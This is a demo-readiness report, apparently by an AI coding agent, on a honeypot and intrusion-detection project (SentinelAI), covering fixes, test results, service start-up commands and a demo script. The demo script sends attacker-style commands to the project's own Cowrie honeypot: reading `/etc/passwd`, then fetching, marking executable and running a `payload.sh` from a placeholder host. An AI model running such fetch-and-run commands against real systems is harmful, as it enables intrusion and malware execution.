# SentinelAI Demo-Readiness Report (2026-10-22)

Branch `demo-readiness` (git worktree `../sentinelai-demo-ready`), cut from `db-fixes` at `9bf7ef1`. Work was isolated because another agent had just committed the v3 honeypot rules (`9bf7ef1`, 13:24) and 18 files from an earlier session (11:03–11:39) are still uncommitted in the main checkout. None of those were touched.

Labels: **VERIFIED** = executed today, output observed. **CODE-ONLY** = read, not executed. **MOCK** = simulated by design. **NOT TESTED**.

Live validation ran against an isolated stack started from this branch: engine on :8002, backend on :5055 with throwaway DB `sentinel-runbook-verify-20261022` and a generated test admin, frontend on :3005, the real Cowrie in WSL, and the parser. Your `sentinel-db` and your running :8000 / :5000 / :3000 were not written to.

---

## 1. Prioritized issues and root causes

| # | Issue | Root cause | Status |
|---|---|---|---|
| 1 | `/deception/score` and `/deception/recommendation` return **HTTP 500** on your running engine (:8000) | Fails inside `get_scorer()` (a read-only `/deception/recommendation` probe also 500s). **The exact cause for that process is NOT DETERMINED:** it started at 12:32, its traceback went to its own console (parent process gone), and it can't be reproduced. The same code, launch command, `--env-file ..\backend\.env` and `ai-engine/.env` return **200** on two fresh engines (:8002 worktree, :8003 main checkout). The contributing defect was real and is **fixed**: any scorer failure surfaced as a bare `Internal Server Error`, and the backend logged only "status code 500". | **Fixed (diagnosability) + VERIFIED working on fresh engines.** **Action: restart your :8000 engine.** If it ever fails again, the response, the engine log and `/model/info` now name the cause. Unscored sessions are kept `deceptionScoringPending` and retried by the 15-minute sweep (`honeypotSweepService`), so nothing is lost. |
| 2 | Your :8000 engine runs **pre-v3 honeypot rules** | Started 12:32; v3 edits landed at 12:53–12:56 and were committed at 13:24 | Same action: restart :8000 |
| 3 | Cowrie blocker blocked nothing in daemon mode | Sync thread started before the `twistd` fork | Fixed in `85d1b7c`; **VERIFIED again today** (daemon thread count 2; reconnect refused) |
| 4 | Deployed Cowrie now listens on **127.0.0.1** only (`9bf7ef1`, `COWRIE_LISTEN_ADDR=127.0.0.1`) | Deliberate local-only hardening. Side effect: every attacker appears as 127.0.0.1, which `containmentPolicyService` protects, so **auto-block can never fire** | Config, not code. For Part C, bind Cowrie to the WSL eth0 IP (reachable from the Windows host only), then restore. Commands in §5 |
| 5 | Dashboard showed "Serving persona: centos_7 (from default)" while Cowrie served ubuntu_22, and computed the recommendation from the wrong state | `getActiveProfile()` fell back to a hard-coded `centos_7` when no operator setting existed, ignoring the persona the parser reports from `cowrie.cfg` | **Fixed + VERIFIED live**: now "ubuntu_22 (from latest_session)"; setting/env precedence unchanged |
| 6 | Dashboard "Active Threat Queue" offered **Block IP** on already-BLOCKED threats and counted every row as "active" | The queue shows the latest 8 threats regardless of status; the action cell ignored status | **Fixed + VERIFIED live**: closed rows show their status; badge reads "N open / M latest" |
| 7 | Stale claims: replay banner "Production Random Forest Model", docstring `rf_classifier_cicids_v2.pkl`, "scores >= 0.7 raised as threats", meter colours at 0.70/0.90; `DEMO_RUNBOOK.md` "updates the firewall rule", "Random Forest features", unlabelled mock engine; Landing counter "AI Accuracy" | Docs and scripts not updated after the switch to XGBoost and the 0.90/0.92 lines | **Fixed** (threat-creation line checked in `aiService.storePrediction`: non-BENIGN and ≥ alert line) |
| 8 | Landing page "SELF-EVOLVING AI" headline and a fake start-up terminal ("live packet … events", "Isolation Forest + Random Forest") | Marketing copy | Terminal text: **already fixed in the uncommitted main-checkout edits** (commit them). Headline: **not changed** (branding, your call); don't say it aloud |
| 9 | 12 AI-engine tests failed in a fresh worktree | Environment only: git checkout converted `models/q_table.json` to CRLF (the tests pin its SHA-256), and the untracked `runtime/` and `datasets/` were absent | No code issue. Byte-identical copy → **592/592 pass** |
| 10 | Replay script's key error message named only `deployment/.env` | It also searches `backend/.env` | Fixed |

Confirmed still true from the audit (no change needed): XGBoost + IF served and sha256-pinned with a 20-row golden check (VERIFIED); time-of-day features inert (VERIFIED earlier); firewall adapter **MOCK**; Q-learner recommends only.

## 2. Files changed (branch `demo-readiness`)

| File | Why |
|---|---|
| `ai-engine/inference/main.py` | `_deception_scorer()` turns scorer-init failure into `503 {error: DECEPTION_SCORER_UNAVAILABLE, reason}` with a log line; scoring failures become `500 {error: DECEPTION_SCORING_FAILED, reason}` with a traceback in the log; `/model/info` gains `deception: {initialized, qTablePath, lastError}` |
| `ai-engine/tests/test_deception_endpoint_errors.py` (new) | 3 regression tests: init failure → 503 + status; scoring failure → named 500; recovery clears the error |
| `backend/services/aiEngineService.js` | `getDeceptionScore` logs the engine's error code and exception type (not the message, which can echo session content) |
| `backend/tests/aiDependencyContract.test.js` | Regression test for that log line, including that the message is not leaked |
| `backend/services/honeypotService.js` | `getActiveProfile()`: setting → env → **latest session's Cowrie-reported persona** → `centos_7` |
| `backend/tests/deceptionProfile.test.js` | Regression test for that precedence |
| `frontend/src/pages/Dashboard.jsx` | Queue: no Block IP on BLOCKED/RESOLVED/FALSE_POSITIVE rows; honest badge |
| `frontend/src/pages/Landing.jsx` | Counter label "AI Accuracy" → "Test-split Accuracy" |
| `ai-engine/demo/replay_cicids.py` | Model/threshold wording, meter colours at 0.92/0.90, `backend/.env` key lookup (the same one-line change as the uncommitted main-checkout edit, so they merge cleanly), error message |
| `docs/DEMO_RUNBOOK.md` | Mock-engine warning, served-model description, simulated containment wording |
| `docs/DEMO_READINESS_REPORT.md` (new) | This report |

Frontend changes are visually checked in the browser only; there is no frontend unit test for them (NOT TESTED by automation).

## 3. Test results

| Suite | Result | Notes |
|---|---|---|
| AI engine, full (`pytest`, worktree) | **592 passed, 0 failed** | After the CRLF/untracked-file alignment (#9). Includes the 3 new tests |
| Backend, full (`jest --runInBand`) before my last two backend changes | **1123 passed, 13 skipped, 0 failed** (74 suites, 4 skipped) | |
| Backend, targeted after all changes (`deceptionProfile`, `honeypot*`, `roleMatrix`, `aiDependencyContract`, `mediumHoneypot`) | **488 passed** | |
| Backend, full re-run after all changes | **1124 passed, 13 skipped, 0 failed** (1137 tests, 74 suites) | |
| Frontend | NOT TESTED by automation | Checked in the browser (VERIFIED visually) |

### End-to-end (VERIFIED, isolated stack, 14:16–14:24 IST)

**A. Real Cowrie session.** Paramiko from Windows → Cowrie at `172.29.32.17:2222` (temporarily bound to the WSL IP) → parser → backend → engine rules → MongoDB → dashboard.
- 6 wrong passwords: first four `SSH Intrusion Attempt 0.75`, fifth and sixth `SSH Brute Force 0.90` (≥ 5 failures rule).
- Download-only session (`whoami`, `uname -a`, `wget …`): `RCE Attempt 0.91`, threat HIGH/MONITORING, **no block**; the reconnect was **accepted**.
- Execution session (adds `cat /etc/passwd`, `chmod +x payload.sh`, `./payload.sh`): `RCE Attempt 0.99`, MITRE T1003, T1003.008, T1033, T1082, T1105, T1222.002, T1548, T1595.
- One HASSH campaign `CAMP-785550C6` (9 sessions, CRITICAL).
- Honeypot page lists all of it, labelled rule-based.

**B. CICIDS2017.** `replay_cicids.py` engine target: 10/10 MATCH, `Model: xgb_cicids_v1`. Backend target: 10/10; MongoDB has 20 AIPredictions (`xgb_cicids_v1`), DDoS threats with T1498, 5 BlockedIP and 5 ContainmentAction (`mock`, ACTIVE). The dashboard lists them; the AI page shows alert 0.90 / block 0.92 / registry PINNED. SHAP explanation returned for a DDoS flow.

**C. Autonomous response.** Execution session → threat CRITICAL → `BLOCKED`, `autonomousAction.taken` (08:50:07Z) → BlockedIP `172.29.32.1` ("AI Classifier auto-block (score = 0.99)") → ContainmentAction `mock` ACTIVE → reconnect: TCP handshake completed, server closed before the banner (`Error reading SSH protocol banner`). Cowrie log: `[SentinelAI] Connection from blocked IP 172.29.32.1 rejected (SSH).` (08:50:16Z).

**Q-learning (separately).** Every session scored (`deceptionScoringPending: false`; e.g. 54.8 for the execution session). The table persisted to the default per-user path and **survived an engine restart**: 12,096 episodes = 12,087 synthetic seed + 9 real. Recommendation: `ubuntu_22 → centos_7`, `explored: false`. **No automatic profile switch happened** (the rotator was not run); `recommendationApplied` stays `false`.

## 4. Remaining limitations and unfinished work

- **Enforcement:** the host firewall adapter is MOCK and the netsh adapter has never run live. The only real enforcement is the Cowrie plugin, for port 2222 only.
- **Honeypot verdicts are rules, not ML.** "RCE Attempt" means a program was fetched and executed in Cowrie's emulated shell; nothing actually ran.
- **The :8000 500 root cause is undetermined** (see #1).
- **Generalisation:** random-split 98.97% vs chronological ≈91% detection vs leave-one-day-out 0.2–80%. The top SHAP feature is `init_win_bytes_backward`, a CICIDS testbed artefact (`experiments/c2_dedup_eval/ablation_no_init_win` exists). Time-of-day features are dead; `payload_entropy` is really byte-direction balance. Classes with < 30 training rows (SQLi, RCE, Lateral) are not meaningful.
- **Demo seam:** replay IPs (198.51.100.x) are not the SSH attacker (172.29.32.1).
- **Not run:** a real malware download (no egress), the persona rotator, the Docker stack, the netsh adapter, unblock → reconnect accepted, frontend unit tests.
- **Uncommitted main-checkout work** (containment `enforcement` field, toast labels, Landing/About/Features copy, audit files, `manualBlockEnforcement.test.js`) is still pending review and commit. It isn't part of this branch.
- **Merge note:** `Dashboard.jsx` and `Landing.jsx` are also modified in that pending work. My hunks are a few lines away from theirs; expect at most a trivial conflict.

## 5. Starting every service (Windows + WSL)

```powershell
# 0. Mongo (Windows service)
Get-Service MongoDB

# 1. AI engine (venv, current code). Restart if it was started before 13:24 today.
cd C:\Users\srisn\Desktop\Projects\sentinelai-complete\ai-engine
.\.venv\Scripts\python.exe -m uvicorn inference.main:app --host 127.0.0.1 --port 8000 --env-file ..\backend\.env
#   check: /ready -> {"status":"ok"};  /model/info -> "deception": {"initialized": ..., "lastError": null}

# 2. Backend, reachable from WSL (<WIN_IP> = WSL default gateway, e.g. 172.29.32.1)
cd C:\Users\srisn\Desktop\Projects\sentinelai-complete\backend
$env:HOST = "<WIN_IP>"; node server.js

# 3. Frontend through the proxy
cd C:\Users\srisn\Desktop\Projects\sentinelai-complete\frontend
$env:SENTINEL_DEV_API_PROXY = "http://<WIN_IP>:5000"; npm run dev
```
```bash
# 4. WSL: Cowrie. For Part C bind it to the WSL IP (loopback attackers can never be blocked)
cd ~/sentinelai-cowrie-test/cowrie && export PATH=~/sentinelai-cowrie-test/env/bin:$PATH
cp etc/cowrie.cfg /tmp/cowrie.cfg.local
sed -i "s#^listen_endpoints .*#listen_endpoints     = tcp:2222:interface=$(hostname -I | awk '{print $1}')#" etc/cowrie.cfg
export HONEYPOT_API_KEY='<backend/.env HONEYPOT_API_KEY>' SENTINEL_API_URL=http://<WIN_IP>:5000/api
cowrie stop; rm -f var/run/cowrie.pid; cowrie start
ls /proc/$(cat var/run/cowrie.pid)/task | wc -l     # must print 2
# after the demo:  cp /tmp/cowrie.cfg.local etc/cowrie.cfg && cowrie restart
```
```powershell
# 5. Parser (Windows)
$env:HONEYPOT_API_KEY = "<same key>"; $env:SENTINEL_API = "http://<WIN_IP>:5000/api"
$env:PARSER_STATE_DIR = "$env:USERPROFILE\.sentinelai\cowrie-parser"
$env:COWRIE_CFG = "\\wsl.localhost\Ubuntu\home\srisnigdha\sentinelai-cowrie-test\cowrie\etc\cowrie.cfg"
C:\Users\srisn\Desktop\Projects\sentinelai-complete\ai-engine\.venv\Scripts\python.exe C:\Users\srisn\Desktop\Projects\sentinelai-complete\honeypot\parsers\log_parser.py --live --log "\\wsl.localhost\Ubuntu\home\srisnigdha\sentinelai-cowrie-test\cowrie\var\log\cowrie\cowrie.json"
```

## 6. Demonstration checklist

**Before the evaluation day**
- [ ] Merge `demo-readiness` (and commit or discard the pending main-checkout edits); then restart all services from the merged code.
- [ ] Rehearse once against a dedicated demo DB.

**30 minutes before**
- [ ] Start services 0–5. `/ready` ok; `/model/info` shows `xgb_cicids_v1`, `registry.verified: true`, `deception.lastError: null`.
- [ ] From WSL: `curl …/api/honeypot/ingest/check-block` → 200.
- [ ] Cowrie thread count = 2; listening on the WSL IP.
- [ ] Settings → Auto-block **ON**. Unblock `<WIN_IP>` if left from a rehearsal.
- [ ] Browser tabs: Dashboard, Honeypot, AI Analytics, Threat Logs.

**Demo sequence**
- [ ] A: `ssh -p 2222 root@<WSL_IP>` (`123456`), then `whoami`, `uname -a`, `cat /etc/passwd`, `wget http://198.51.100.50/payload.sh`, `chmod +x payload.sh`, `./payload.sh`, `exit` → Honeypot page shows the MITRE chips and RCE Attempt 0.99.
- [ ] B: `.venv\Scripts\python.exe demo\replay_cicids.py --rows 10 --delay 1.5 --api-url http://127.0.0.1:8000` → 10 lines with `Model: xgb_cicids_v1`.
- [ ] C: the attacker's threat is BLOCKED; reconnect → connection closed before the banner; Cowrie log shows `rejected (SSH)`.
- [ ] Say: "the firewall adapter is simulated; enforcement is at the honeypot", "session verdicts are rules", "98.97% random split, about 91% chronological".

## 7. Roadmap toward production readiness (separate from the demo)

1. **Enforcement:** run the netsh adapter in a disposable Windows VM, measure block latency, add rollback-on-expiry tests; for Linux, an nftables adapter. Keep mock as the default.
2. **Honeypot isolation:** run the pinned Docker stack with `egress-rules.sh` on a Linux VM; verify egress denial; never expose the WSL install.
3. **Engine operations:** a startup self-test of the Q-table path (log `qTablePath`); expose `deception.lastError` in `/ready` diagnostics and in the dashboard; supervised services (systemd / NSSM) instead of hand-started consoles, which is what made #1 undiagnosable.
4. **Model:** drop dead features (time of day), rename `payload_entropy`, run the `init_win` ablation into the registry decision, add more data for the tiny classes (or merge them), add a cross-dataset test (CSE-CIC-IDS2018) before claiming generalisation.
5. **Honeypot learning:** persona attribution and rotation only with zero active sessions (exists); collect real-session episodes separately from the synthetic seed; evaluate the ≥ 40% engagement objective properly before claiming it.
6. **Security and QA:** frontend unit tests (queue states, labels); CI running both suites on a clean checkout with `core.autocrlf=false` for pinned artefacts; secrets in a vault rather than `.env`; TLS and `NODE_ENV=production` topology checks.
